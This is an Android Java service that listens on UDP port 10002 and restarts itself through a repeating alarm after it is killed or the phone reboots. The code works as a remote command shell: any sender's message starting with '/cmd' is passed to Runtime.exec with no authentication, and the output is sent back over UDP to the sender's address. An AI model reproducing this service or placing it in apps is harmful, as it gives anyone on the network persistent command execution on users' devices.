package koyrim.util.network.nwtservice;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayList;

import android.R.bool;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.Notification.Builder;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.RingtoneManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.util.Log;
import android.widget.Toast;

public class UDPService extends Service {

	private final static String tag = "UDPService";

	public static boolean isRestarting = false;
	public static int connMode = -1;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	AutoStart receiver;

	public void onCreate() {
		unregisterRestartAlarm(); // 이미 등록된 알람이 있으면 제거

		setInit();

		IntentFilter mintentFilter = new IntentFilter();
		// mWifiFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
		// mWifiFilter.addAction(WifiManager.RSSI_CHANGED_ACTION);
		mintentFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
		mintentFilter.addAction(Intent.ACTION_PACKAGE_ADDED);
		mintentFilter.addAction(Intent.ACTION_PACKAGE_REPLACED);
		mintentFilter.addAction(Intent.ACTION_BOOT_COMPLETED);
		mintentFilter.addAction("AutoStart.Restart");
		mintentFilter.addDataScheme("package");
		receiver = new AutoStart();
		registerReceiver(receiver, mintentFilter);
	}

	public void onDestroy() {
		Toast.makeText(this, "UDPService Stop", Toast.LENGTH_SHORT).show();
		registerRestartAlarm(); // 서비스가 죽을 때 알람 등록
		unregisterReceiver(receiver);
		Log.d(tag, "onDestroy");
	}

	private void registerRestartAlarm() {
		Log.d(tag, "registerRestartAlarm");
		Intent intent = new Intent(this, AutoStart.class);
		intent.setAction(AutoStart.ACTION_RESTART_SERVICE);
		PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent, 0); // 브로드케스트할
																				// Intent
		long firstTime = SystemClock.elapsedRealtime(); // 현재 시간
		firstTime += 3 * 1000; // 10초 후에 알람이벤트 발생
		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE); // 알람
																			// 서비스
																			// 등록
		am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstTime,
				10 * 1000, sender); // 알람이
	}

	private void unregisterRestartAlarm() {
		Log.d(tag, "unregisterRestartAlarm");
		Intent intent = new Intent(UDPService.this, AutoStart.class);
		intent.setAction(AutoStart.ACTION_RESTART_SERVICE);
		PendingIntent sender = PendingIntent.getBroadcast(UDPService.this, 0,
				intent, 0);
		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.cancel(sender);
	}

	public int onStartCommand(Intent intent, int flags, int startid) {
		// Intent intents = new Intent(getBaseContext(), UDPEngine.class);
		// startActivity(intents);
		Toast.makeText(this, "UDPService Start", Toast.LENGTH_SHORT).show();
		Log.d(tag, "onStart");

		return START_REDELIVER_INTENT;
	}

	private String connectedIP;
	private boolean connected;
	private int serverPort = 10002;
	private MessageBox sendBox, talkBox;

	public static Context svcContext;

	private void setInit() {

		svcContext = this;

		// getIPAddress();
		connectedIP = "";
		connected = false;

		// messagebox
		sendBox = new MessageBox();
		talkBox = new MessageBox();

		runUDPThread();
		AddStory(getNetworkMode());
	}

	private String getNetworkMode() {
		ConnectivityManager cManager; 
		NetworkInfo mobile; 
		NetworkInfo wifi; 
		 
		cManager=(ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE); 
		mobile = cManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
		wifi = cManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI); 
		 
		if(mobile.isConnected())
			return "Mobile On";
		if(wifi.isConnected())
			return "WiFi On";
		return "";
	}
	
	private String getIPAddress() {
		try {
			Socket socket = new Socket("www.google.com", 80);
			String ip = socket.getLocalAddress().toString();
			socket.close();
			return ip;
		} catch (Exception e) {
			Log.i("ERROR", e.getMessage());
		}
		return "127.0.0.2";
	}

	Thread thSendPkt = null;

	@SuppressLint("NewApi")
	private void sendPkt(String msg) {
		sendBox.set(msg);
		Log.i("sendPkt", msg);

		if (connectedIP.isEmpty())
			return;
		if (thSendPkt != null
				&& !thSendPkt.getState().equals(Thread.State.TERMINATED))
			return;
		thSendPkt = new Thread(new Runnable() {

			@Override
			public void run() {

				try {
					while (!sendBox.isEmpty()) {
						byte[] buf = sendBox.get().getBytes();
						InetAddress serverAddr = InetAddress
								.getByName(connectedIP);
						DatagramSocket socket = new DatagramSocket();
						DatagramPacket out_datagramPacket = new DatagramPacket(
								buf, buf.length, serverAddr, serverPort);
						socket.send(out_datagramPacket);
						socket.close();

					}
				} catch (Exception e) {
					Log.i("ERROR", e.toString() + " / " + e.getMessage());
					AddStory("ERR : " + e.toString() + " / " + e.getMessage());
				}

			}
		});
		thSendPkt.start();
	}

	private void readCmd(String cmd) {
		String[] param = cmd.split(" ");

		if (param[0].equals("conn")) {
			startServer();
		} else if (param[0].equals("setIP")) {
			connectedIP = param[1];
		} else if (param[0].equals("disconn")) {
			stopServer();
		} else if (param[0].equals("port")) {
			serverPort = Integer.parseInt(param[1]);
		} else if (param[0].equals("cmd")) {
			String result = ExeCmd(cmd.substring(4));
			Log.i("readCmd", result);
			AddStory(result);
		}

	}

	private String ExeCmd(String cmd) {
		Runtime runtime = Runtime.getRuntime();
		Process process;
		String res = "";
		try {
			process = runtime.exec(cmd);
			process.waitFor();

			BufferedReader br = new BufferedReader(new InputStreamReader(
					process.getInputStream()));
			String line;
			while ((line = br.readLine()) != null) {
				res += " \r\n" + line;
			}

			Log.i("ExeCmd", res);
			return res;
		} catch (Exception e) {
			e.fillInStackTrace();
			Log.e("ExeCmd", "Unable to execute command\r\n" + e.toString());
			return "Unable to execute command\r\n" + e.toString();
		}
	}

	Thread udpThread = null;
	DatagramSocket sckRecv = null;

	private boolean runUDPThread() {
		if (udpThread != null
				&& !udpThread.getState().equals(Thread.State.TERMINATED)) {
			Log.i("runUDPThread", "Thread isn't TERMINATER");
			Log.i("runUDPThread",
					"udpThread != null : " + String.valueOf(udpThread != null));
			Log.i("runUDPThread",
					"!udpThread.getState().equals(Thread.State.TERMINATED) : "
							+ String.valueOf(!udpThread.getState().equals(
									Thread.State.TERMINATED)));
			udpThread.interrupt();
			return false;
		}
		udpThread = new Thread(new Runnable() {

			public void run() {
				try {
					String msg;
					connected = true;
					sckRecv = new DatagramSocket(serverPort);

					AddStory("#] UDP Server Receiving at " + getIPAddress()
							+ " : " + serverPort + " ... ");
					while (connected) {
						byte[] buf = new byte[1024];
						DatagramPacket dPkt = new DatagramPacket(buf,
								buf.length);
						sckRecv.receive(dPkt);
						if (!connected)
							break;
						msg = new String(dPkt.getData(), 0, dPkt.getLength(),
								"utf-8");
						connectedIP = dPkt.getAddress().getHostAddress();
						AddStory("R] " + dPkt.getAddress().getHostAddress()
								+ " : " + msg);

						Log.d("cmdLoc", msg);
						if (msg.substring(0, 1).equals("/")) {
							readCmd(msg.substring(1));
						}
					}
					if (!sckRecv.isClosed())
						sckRecv.close();
				} catch (Exception e) {
					Log.i("runUDPThread", e.toString() + " / " + e.getMessage());
					AddStory("ERR : " + e.toString() + " / " + e.getMessage());
				}
			}
		});

		udpThread.start();
		Log.i("runUDPThread", "Success");
		return true;
	}

	public boolean startServer() {
		if (!runUDPThread()) {
			Log.i("startServer", "fail to startServer");
			return false;
		}
		return true;
	}

	public void stopServer() {
		connected = false;
		if (sckRecv != null)
			sckRecv.close();
		udpThread.interrupt();
	}

	public Boolean isServerAlive() {

		return udpThread.isInterrupted();
	}

	private Handler mHandler = new Handler() {
		@SuppressLint("NewApi")
		public void handleMessage(Message msg) {

			NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

			Builder builder = new Builder(UDPService.this);
			builder.setSmallIcon(R.drawable.ic_launcher)
					.setContentTitle("알립니다").setContentText(msg.obj.toString())
					.setAutoCancel(true)
					// 알림바에서 자동 삭제
					// .setVibrate(new long[] { 1000, 1000 })
					.setSound(
							RingtoneManager
									.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION));
			// autoCancel : 한번 누르면 알림바에서 사라진다.
			// vibrate : 쉬고, 울리고, 쉬고, 울리고... 밀리세컨
			// 진동이 되려면 AndroidManifest.xml에 진동 권한을 줘야 한다.

			new Notification.BigTextStyle(builder).setSummaryText("and More +")
					.setBigContentTitle("알립니다.[확장]")
					.bigText(msg.obj.toString());

			// // 알람 클릭시 MainActivity를 화면에 띄운다.
			// Intent intent = new
			// Intent(getApplicationContext(),MainActivity.class);
			// PendingIntent pIntent =
			// PendingIntent.getActivity(getApplicationContext()
			// , 0
			// , intent
			// , Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT);
			// builder.setContentIntent(pIntent);
			manager.notify(1, builder.build());
		};
	};

	public void AddStory(String talk) {
		talkBox.set(talk);

		Log.d("AddStory", talk);

		while (!talkBox.isEmpty()) {
			Message tMsg = Message.obtain();
			tMsg.obj = talkBox.get();
			mHandler.sendMessage(tMsg);
			sendPkt(tMsg.obj.toString());
		}

	}

	class MessageBox {

		ArrayList<String> ar;

		public MessageBox() {
			ar = new ArrayList<String>();
		}

		public String get() {
			if (ar.size() < 1)
				return "";
			String val = ar.get(0);
			ar.remove(0);
			return val;
		}

		public void set(String val) {
			ar.add(val);
		}

		public Boolean isEmpty() {
			return ar.size() == 0;
		}
	}

}
